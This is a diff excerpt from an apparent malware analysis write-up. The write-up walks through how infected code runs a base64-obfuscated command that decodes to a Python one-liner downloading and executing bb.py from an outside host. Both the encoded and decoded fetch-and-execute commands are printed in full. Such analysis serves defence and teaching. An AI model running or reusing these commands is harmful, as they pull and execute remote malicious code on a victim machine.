@@ -75,12 +75,15 @@ The first thing that the code does is check to see if the infected operating sys
 Next the code will use Python's chmod method to change the permissons to 0777. After that is done the code will use Python's system command to run commands on the infected machine. The command looked like this:
 
 `echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -` 
+
+
 Figure 2 shows the line decoding the base64 string and execting the decoded command on the system.
 
 
 The command above will use the system's echo command to echo the base64 string, the '|' tells the operating system to also run the command 'base64 -d' on the base64 string. The 'base64 -d' command is used to decode base64 strings. The decoded command looks like this:
 
 `python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())'`
+
 Figure 3 shows the decoded string that was in Figure 2. 
 
 First the code uses the -c arguments. This tells the machine to execute everything that follows it. Next the code imports the urllib module. Next the code uses ';' to join the the rest of the command. As soon as the machine finishes importing urllib it will not exit the proccess. The exec method is used by Python to run code on the machine. In the example, the code is using urllib to visit the site: 'http://bash.givemexyz.in/bb.py' to download a file named bb.py
